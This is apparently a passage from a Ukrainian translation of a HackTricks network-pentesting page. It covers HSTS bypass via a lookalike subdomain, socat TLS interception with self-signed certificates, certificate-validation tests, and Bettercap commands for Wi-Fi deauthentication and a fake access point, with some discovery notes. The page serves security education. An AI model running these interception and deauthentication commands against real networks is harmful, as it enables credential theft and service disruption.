**–ú–µ—Ç–∞** —Ü—ñ—î—ó —Ç–µ—Ö–Ω—ñ–∫–∏ –ø–æ–ª—è–≥–∞—î –≤ —Ç–æ–º—É, —â–æ–± **—É–Ω–∏–∫–Ω—É—Ç–∏ HSTS**, –æ—Å–∫—ñ–ª—å–∫–∏ _**wwww**.facebook.com_ **–Ω–µ –±—É–¥–µ** –∑–±–µ—Ä–µ–∂–µ–Ω–æ –≤ **–∫–µ—à—ñ** –±—Ä–∞—É–∑–µ—Ä–∞, —Ç–æ–º—É –±—Ä–∞—É–∑–µ—Ä –±—É–¥–µ –æ–±–º–∞–Ω—É—Ç–æ –≤–∏–∫–æ–Ω–∞—Ç–∏ **–∞–≤—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—é facebook —á–µ—Ä–µ–∑ HTTP**.\
–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ –¥–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è —Ü—ñ—î—ó –∞—Ç–∞–∫–∏ –∂–µ—Ä—Ç–≤–∞ –ø–æ–≤–∏–Ω–Ω–∞ —Å–ø–æ—á–∞—Ç–∫—É —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ –æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ [http://www.faceook.com](http://www.faceook.com), –∞ –Ω–µ https. –¶–µ –º–æ–∂–Ω–∞ –∑—Ä–æ–±–∏—Ç–∏, –º–æ–¥–∏—Ñ—ñ–∫—É—é—á–∏ –ø–æ—Å–∏–ª–∞–Ω–Ω—è –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ http-—Å—Ç–æ—Ä—ñ–Ω–∫–∏.

–ë—ñ–ª—å—à–µ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó [—Ç—É—Ç](https://www.bettercap.org/legacy/#hsts-bypass), [—Ç—É—Ç](https://www.slideshare.net/Fatuo\_\_/offensive-exploiting-dns-servers-changes-blackhat-asia-2014) —Ç–∞ [—Ç—É—Ç](https://security.stackexchange.com/questions/91092/how-does-bypassing-hsts-with-sslstrip-work-exactly).

**sslStrip –∞–±–æ sslStrip+ –±—ñ–ª—å—à–µ –Ω–µ –ø—Ä–∞—Ü—é—é—Ç—å. –¶–µ –ø–æ–≤'—è–∑–∞–Ω–æ –∑ —Ç–∏–º, —â–æ –≤ –±—Ä–∞—É–∑–µ—Ä–∞—Ö –∑–±–µ—Ä–µ–∂–µ–Ω—ñ –ø—Ä–∞–≤–∏–ª–∞ HSTS, —Ç–æ–º—É –Ω–∞–≤—ñ—Ç—å —è–∫—â–æ —Ü–µ –ø–µ—Ä—à–∏–π —Ä–∞–∑, –∫–æ–ª–∏ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á –æ—Ç—Ä–∏–º—É—î –¥–æ—Å—Ç—É–ø –¥–æ "–≤–∞–∂–ª–∏–≤–æ–≥–æ" –¥–æ–º–µ–Ω—É, –≤—ñ–Ω –æ—Ç—Ä–∏–º–∞—î –¥–æ—Å—Ç—É–ø –¥–æ –Ω—å–æ–≥–æ —á–µ—Ä–µ–∑ HTTPS. –¢–∞–∫–æ–∂ –∑–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ –∑–±–µ—Ä–µ–∂–µ–Ω—ñ –ø—Ä–∞–≤–∏–ª–∞ —Ç–∞ —ñ–Ω—à—ñ –∑–≥–µ–Ω–µ—Ä–æ–≤–∞–Ω—ñ –ø—Ä–∞–≤–∏–ª–∞ –º–æ–∂—É—Ç—å –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –ø—Ä–∞–ø–æ—Ä–µ—Ü—å** [**`includeSubdomains`**](https://hstspreload.appspot.com) **—Ç–æ–º—É –ø—Ä–∏–∫–ª–∞–¥** _**wwww.facebook.com**_ **–∑ –ø–æ–ø–µ—Ä–µ–¥–Ω—å–æ–≥–æ –Ω–µ —Å–ø—Ä–∞—Ü—é—î, –æ—Å–∫—ñ–ª—å–∫–∏** _**facebook.com**_ **–≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î HSTS –∑ `includeSubdomains`.**

TODO: easy-creds, evilgrade, metasploit, factory

## TCP –ø—Ä–æ—Å–ª—É—Ö–æ–≤—É–≤–∞–Ω–Ω—è –Ω–∞ –ø–æ—Ä—Ç—É
```bash
sudo nc -l -p 80
socat TCP4-LISTEN:80,fork,reuseaddr -
```
## TCP + SSL –ø—Ä–æ—Å–ª—É—Ö–æ–≤—É–≤–∞–Ω–Ω—è –Ω–∞ –ø–æ—Ä—Ç—É

#### –ì–µ–Ω–µ—Ä–∞—Ü—ñ—è –∫–ª—é—á—ñ–≤ —Ç–∞ —Å–∞–º–æ–ø—ñ–¥–ø–∏—Å–∞–Ω–æ–≥–æ —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç–∞
```
FILENAME=server
# Generate a public/private key pair:
openssl genrsa -out $FILENAME.key 1024
# Generate a self signed certificate:
openssl req -new -key $FILENAME.key -x509 -sha256 -days 3653 -out $FILENAME.crt
# Generate the PEM file by just appending the key and certificate files:
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
```
#### –°–ª—É—Ö–∞—Ç–∏ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç–∞
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0 -
```
#### –°–ª—É—Ö–∞—Ç–∏, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç, —ñ –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª—è—Ç–∏ –Ω–∞ —Ö–æ—Å—Ç–∏
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0  openssl-connect:[SERVER]:[PORT],verify=0
```
–Ü–Ω–æ–¥—ñ, —è–∫—â–æ –∫–ª—ñ—î–Ω—Ç –ø–µ—Ä–µ–≤—ñ—Ä—è—î, —â–æ CA —î –¥—ñ–π—Å–Ω–∏–º, –≤–∏ –º–æ–∂–µ—Ç–µ **–ø—Ä–µ–¥—Å—Ç–∞–≤–∏—Ç–∏ —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç —ñ–Ω—à–æ–≥–æ —ñ–º–µ–Ω—ñ —Ö–æ—Å—Ç–∞, –ø—ñ–¥–ø–∏—Å–∞–Ω–∏–π CA**.\
–©–µ –æ–¥–∏–Ω —Ü—ñ–∫–∞–≤–∏–π —Ç–µ—Å—Ç - —Ü–µ **–ø—Ä–µ–¥—Å—Ç–∞–≤–∏—Ç–∏ —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç –∑–∞–ø–∏—Ç—É–≤–∞–Ω–æ–≥–æ —ñ–º–µ–Ω—ñ —Ö–æ—Å—Ç–∞, –∞–ª–µ —Å–∞–º–æ–ø—ñ–¥–ø–∏—Å–∞–Ω–∏–π**.

–Ü–Ω—à—ñ —Ä–µ—á—ñ –¥–ª—è —Ç–µ—Å—Ç—É–≤–∞–Ω–Ω—è - —Ü–µ —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ –ø—ñ–¥–ø–∏—Å–∞—Ç–∏ —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç –¥—ñ–π—Å–Ω–∏–º —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç–æ–º, —è–∫–∏–π –Ω–µ —î –¥—ñ–π—Å–Ω–∏–º CA. –ê–±–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –¥—ñ–π—Å–Ω–∏–π –≤—ñ–¥–∫—Ä–∏—Ç–∏–π –∫–ª—é—á, –ø—Ä–∏–º—É—Å–∏—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –∞–ª–≥–æ—Ä–∏—Ç–º, —è–∫-–æ—Ç diffie hellman (—Ç–æ–π, —â–æ –Ω–µ –ø–æ—Ç—Ä–µ–±—É—î —Ä–æ–∑—à–∏—Ñ—Ä–æ–≤–∫–∏ –Ω—ñ—á–æ–≥–æ –∑ —Ä–µ–∞–ª—å–Ω–∏–º –ø—Ä–∏–≤–∞—Ç–Ω–∏–º –∫–ª—é—á–µ–º) —ñ –∫–æ–ª–∏ –∫–ª—ñ—î–Ω—Ç –∑–∞–ø–∏—Ç—É—î –ø—Ä–æ–±—É —Ä–µ–∞–ª—å–Ω–æ–≥–æ –ø—Ä–∏–≤–∞—Ç–Ω–æ–≥–æ –∫–ª—é—á–∞ (—è–∫ —Ö–µ—à), –Ω–∞–¥—ñ—Å–ª–∞—Ç–∏ —Ñ–∞–ª—å—à–∏–≤—É –ø—Ä–æ–±—É —ñ —Å–ø–æ–¥—ñ–≤–∞—Ç–∏—Å—è, —â–æ –∫–ª—ñ—î–Ω—Ç –Ω–µ –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç—å —Ü–µ.

## Bettercap
```bash
# Events
events.stream off #Stop showing events
events.show #Show all events
events.show 5 #Show latests 5 events
events.clear

# Ticker (loop of commands)
set ticker.period 5; set ticker.commands "wifi.deauth DE:AD:BE:EF:DE:AD"; ticker on

# Caplets
caplets.show
caplets.update

# Wifi
wifi.recon on
wifi.deauth BSSID
wifi.show
# Fake wifi
set wifi.ap.ssid Banana
set wifi.ap.bssid DE:AD:BE:EF:DE:AD
set wifi.ap.channel 5
set wifi.ap.encryption false #If true, WPA2
wifi.recon on; wifi.ap
```
### Active Discovery Notes

–í—Ä–∞—Ö—É–π—Ç–µ, —â–æ –∫–æ–ª–∏ UDP –ø–∞–∫–µ—Ç –Ω–∞–¥—Å–∏–ª–∞—î—Ç—å—Å—è –Ω–∞ –ø—Ä–∏—Å—Ç—Ä—ñ–π, —è–∫–∏–π –Ω–µ –º–∞—î –∑–∞–ø–∏—Ç—É–≤–∞–Ω–æ–≥–æ –ø–æ—Ä—Ç—É, –Ω–∞–¥—Å–∏–ª–∞—î—Ç—å—Å—è ICMP (Port Unreachable).

### **ARP discover**

ARP –ø–∞–∫–µ—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å—Å—è –¥–ª—è –≤–∏—è–≤–ª–µ–Ω–Ω—è, —è–∫—ñ IP-–∞–¥—Ä–µ—Å–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å—Å—è –≤ –º–µ—Ä–µ–∂—ñ. –ü–ö –ø–æ–≤–∏–Ω–µ–Ω –Ω–∞–¥—ñ—Å–ª–∞—Ç–∏ –∑–∞–ø–∏—Ç –¥–ª—è –∫–æ–∂–Ω–æ—ó –º–æ–∂–ª–∏–≤–æ—ó IP-–∞–¥—Ä–µ—Å–∏, —ñ –ª–∏—à–µ —Ç—ñ, —â–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å—Å—è, –≤—ñ–¥–ø–æ–≤—ñ–¥–∞—é—Ç—å.

### **mDNS (multicast DNS)**

Bettercap –Ω–∞–¥—Å–∏–ª–∞—î –∑–∞–ø–∏—Ç MDNS (–∫–æ–∂–Ω—ñ X –º—Å), –∑–∞–ø–∏—Ç—É—é—á–∏ **\_services\_.dns-sd.\_udp.local**; –º–∞—à–∏–Ω–∞, —è–∫–∞ –±–∞—á–∏—Ç—å —Ü–µ–π –ø–∞–∫–µ—Ç, –∑–∞–∑–≤–∏—á–∞–π –≤—ñ–¥–ø–æ–≤—ñ–¥–∞—î –Ω–∞ —Ü–µ–π –∑–∞–ø–∏—Ç. –ü–æ—Ç—ñ–º –≤–æ–Ω–∞ –ª–∏—à–µ —à—É–∫–∞—î –º–∞—à–∏–Ω–∏, —è–∫—ñ –≤—ñ–¥–ø–æ–≤—ñ–¥–∞—é—Ç—å –Ω–∞ "services".

**Tools**

* Avahi-browser (--all)
* Bettercap (net.probe.mdns)
* Responder

### **NBNS (NetBios Name Server)**

Bettercap —Ç—Ä–∞–Ω—Å–ª—é—î –ø–∞–∫–µ—Ç–∏ –Ω–∞ –ø–æ—Ä—Ç 137/UDP, –∑–∞–ø–∏—Ç—É—é—á–∏ —ñ–º'—è "CKAAAAAAAAAAAAAAAAAAAAAAAAAAA".

### **SSDP (Simple Service Discovery Protocol)**

Bettercap —Ç—Ä–∞–Ω—Å–ª—é—î –ø–∞–∫–µ—Ç–∏ SSDP, —à—É–∫–∞—é—á–∏ –≤—Å—ñ –≤–∏–¥–∏ –ø–æ—Å–ª—É–≥ (UDP Port 1900).

### **WSD (Web Service Discovery)**

Bettercap —Ç—Ä–∞–Ω—Å–ª—é—î –ø–∞–∫–µ—Ç–∏ WSD, —à—É–∫–∞—é—á–∏ –ø–æ—Å–ª—É–≥–∏ (UDP Port 3702).

## References

* [https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)
* **–û—Ü—ñ–Ω–∫–∞ –±–µ–∑–ø–µ–∫–∏ –º–µ—Ä–µ–∂—ñ: –ó–Ω–∞–π—Ç–µ —Å–≤–æ—é –º–µ—Ä–µ–∂—É (3-–µ –≤–∏–¥–∞–Ω–Ω—è)**
* **–ü—Ä–∞–∫—Ç–∏—á–Ω–∏–π IoT –•–∞–∫—ñ–Ω–≥: –û—Å—Ç–∞–Ω–Ω—ñ–π –ø–æ—Å—ñ–±–Ω–∏–∫ –∑ –∞—Ç–∞–∫–∏ –Ω–∞ –Ü–Ω—Ç–µ—Ä–Ω–µ—Ç —Ä–µ—á–µ–π. –ê–≤—Ç–æ—Ä–∏: –§–æ—Ç—ñ—Å –•–∞–Ω—Ü–∏—Å, –ô–æ–∞–Ω–Ω—ñ—Å –°—Ç–∞–π—Å, –ü–∞—É–ª—ñ–Ω–æ –ö–∞–ª—å–¥–µ—Ä–æ–Ω, –Ñ–≤–∞–Ω–≥–µ–ª–æ—Å –î–µ–π—Ä–º–µ–Ω—Ç–∑–æ–≥–ª—É, –ë–µ–æ –í—É–¥**
* [https://medium.com/@cursedpkt/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@cursedpkt/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)

<img src="../../.gitbook/assets/i3.png" alt="" data-size="original">\
**–ü–æ—Ä–∞–¥–∞ –∑ –±–∞–≥-–±–∞—É–Ω—Ç—ñ**: **–∑–∞—Ä–µ—î—Å—Ç—Ä—É–π—Ç–µ—Å—å** –Ω–∞ **Intigriti**, –ø—Ä–µ–º—ñ—É–º **–ø–ª–∞—Ç—Ñ–æ—Ä–º—ñ –¥–ª—è –±–∞–≥-–±–∞—É–Ω—Ç—ñ, —Å—Ç–≤–æ—Ä–µ–Ω—ñ–π —Ö–∞–∫–µ—Ä–∞–º–∏ –¥–ª—è —Ö–∞–∫–µ—Ä—ñ–≤**! –ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ –Ω–∞—Å –Ω–∞ [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) —Å—å–æ–≥–æ–¥–Ω—ñ —Ç–∞ –ø–æ—á–Ω—ñ—Ç—å –∑–∞—Ä–æ–±–ª—è—Ç–∏ –≤–∏–Ω–∞–≥–æ—Ä–æ–¥–∏ –¥–æ **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

{% hint style="success" %}
–í—á—ñ—Ç—å—Å—è —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ AWS –•–∞–∫—ñ–Ω–≥:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
–í—á—ñ—Ç—å—Å—è —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ GCP –•–∞–∫—ñ–Ω–≥: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>–ü—ñ–¥—Ç—Ä–∏–º–∞—Ç–∏ HackTricks</summary>

* –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ø–ª–∞–Ω–∏ –ø—ñ–¥–ø–∏—Å–∫–∏**](https://github.com/sponsors/carlospolop)!
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ Telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –≤ **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **–î—ñ–ª—ñ—Ç—å—Å—è —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞—é—á–∏ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ –Ω–∞ GitHub.

</details>
{% endhint %}
